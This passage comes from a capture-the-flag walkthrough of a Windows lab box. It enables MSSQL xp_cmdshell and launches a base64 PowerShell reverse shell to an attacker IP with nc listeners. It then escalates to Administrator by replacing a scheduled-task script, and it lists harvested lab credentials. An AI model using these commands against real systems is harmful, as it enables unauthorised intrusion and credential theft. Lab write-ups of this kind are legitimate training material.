[*] INFO(TALLY): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE
SQL (sa  dbo@master)> sp_configure 'xp_cmdshell', '1'
[*] INFO(TALLY): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE
SQL (sa  dbo@master)> EXEC master..xp_cmdshell 'whoami'
output        
-----------   
tally\sarah   

NULL          

SQL (sa  dbo@master)> 
```

The command are executed under user "tally\sarah".

### Get a shell

Using [RevShell](https://www.revshells.com/), we generate a reverse shell using the folloing configuration :

- IP : 10.10.14.17 (Attacker IP)
- port : 9001
- Type: Reverse
- OS: Windows
- Type: "Powershell #3 (Base64)"
- Shell: bash
- Encoding: none

The base64 version evoid having to worry about bad characters in the MSSQL command line.

Start the listener :

```shell
rlwrap nc -nvlp 9001
```

Then inject the full commands including the powershell payload :

```sql
sp_configure 'Show Advanced Options', 1
RECONFIGURE
sp_configure 'xp_cmdshell', 1
RECONFIGURE
xp_cmdshell "powershell -e JABjAGwAa
... Replace Payload Here ...
UAKAApAA=="
```

As a result, we have a powershell shell :

```text
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.59.
Ncat: Connection from 10.10.10.59:56375.
whoami
tally\sarah
PS C:\Windows\system32> 
```

## Post-Exploitation

### Host Reconnaissance

Moving from the Windows folder to Sarah home folder (`C:\users\sarah\Desktop`) is interesting :

```powershell
PS> cd C:\users\sarah\Desktop
PS> ls
```

Result:

```text
    Directory: C:\users\sarah\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       01/10/2017     22:32            916 browser.bat
-a----       17/09/2017     21:50            845 FTP.lnk            
-a----       23/09/2017     21:11            297 note to tim (draft).txt
-a----       19/10/2017     21:49          17152 SPBestWarmUp.ps1
-a----       19/10/2017     22:48          11010 SPBestWarmUp.xml
-a----       17/09/2017     21:48           1914 SQLCMD.lnk
-a----       21/09/2017     00:46            129 todo.txt
-a----       17/09/2017     21:49            936 zz_Migration.lnk
```

We can read the text note `note to tim (draft).txt`:

```text
Hi Tim,

As discussed in the cybersec meeting, malware is often hidden in trusted executables in order to evade detection. I read somewhere that cmd.exe is a common target for backdooring, so I've gone ahead and disallowed any cmd.exe outside the Windows folder from executing.

Thanks,
Sarah
```

We can read the text note `todo.txt`:

```text
done:

install updates
check windows defender enabled

outstanding:

update intranet design
update server inventory
```

The powershelscript `SPBestWarmUp.ps1` is a helper to warm up IIS cache. It gives a description in its header :

```text
.SYNOPSIS
	Warm up SharePoint IIS W3WP memory cache by loading pages from WebRequest

.DESCRIPTION
	Loads the full page so resources like CSS, JS, and images are included. Please modify lines 374-395 to suit your portal content design (popular URLs, custom pages, etc.)
	
	Comments and suggestions always welcome!  Please, use the issues panel at the project page.
```

This script comes with `SPBestWarmUp.xml`. This XML file is a task scheduling export and will call `SPBestWarmUp.ps1` :

```XML
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <Repetition>
        <Interval>PT1H</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2017-01-25T01:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>

... snip ...

  <Principals>
    <Principal id="Author">
      <UserId>TALLY\Administrator</UserId>
      <LogonType>Password</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>

... snip ...

  <Actions Context="Author">
    <Exec>
      <Command>PowerShell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -File SPBestWarmUp.ps1 -skipadmincheck</Arguments>
      <WorkingDirectory>C:\Users\Sarah\Desktop</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
```

According to trigger, it will be triggered every hour (Interval = PT1H). There are also some events related to IIS conditions.

This task will be executed as Administrator account, that is interesting.

### Privilege Escalation

The scheduled task, if activated, will execute the powershell script `SPBestWarmUp.ps1`.

```shell
icacls SPBestWarmUp.ps1
```

Result:

```text
SPBestWarmUp.ps1 NT AUTHORITY\SYSTEM:(F)
                 BUILTIN\Administrators:(F)
                 TALLY\Sarah:(F)

Successfully processed 1 files; Failed processing 0 files
```

Hopefully, Sarah user have full access on this script file.

Just as previously, using [RevShell](https://www.revshells.com/), we generate another reverse shell using the folloing configuration :

- IP : 10.10.14.17 (Attacker IP)
- port : **9002**
- Type: Reverse
- OS: Windows
- Type: "Powershell #3 (Base64)"
- Shell: bash
- Encoding: none

We do the same reverse-shell, but only change the listenig port.

We start a second listener :

```shell
rlwrap nc -nvlp 9002
```

In the current shell, we can rename (for backup) the actual script `SPBestWarmUp.ps1`, and replace it with our payload :

```shell
mv SPBestWarmUp.ps1 SPBestWarmUp.ps1.back
set-content -Path "C:\users\sarah\Desktop\SPBestWarmUp.ps1" -Value "powershell -e JABjAGwAa
... Replace Payload Here ...
UAKAApAA=="
```

Now, we have to wait for the scheduled task to be activated.

As a result, we have a priviledged powershell shell :

```text
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9002
Ncat: Listening on 0.0.0.0:9002
Ncat: Connection from 10.10.10.59.
Ncat: Connection from 10.10.10.59:57126.
whoami
tally\administrator
PS C:\Users\Sarah\Desktop> 
```

We have an administrator shell on host.

## Loots

### credentials

| username        | password          | Hash  | Usage |
| ---             | ---               | ---   | ---   |
| ftp_user        | UTDRSCH53c"$6hys  |       | FTP   |
| tally/administrator |               |       |       |
| Rahul ???       |                   |       |       |
| Sarah ???       |                   |       |       |
| Tim ???         |                   |       |       |
| -              | simplementeyo    |       | keepassfile `tally/User/Tim/Files/tim.kdbx` |
| Finance       | Acc0unting    | | SMB Share "//tally/ACCT/" |
| sa  | GWE3V65#6KFH93@4GWTG2G | | MS SQL server |
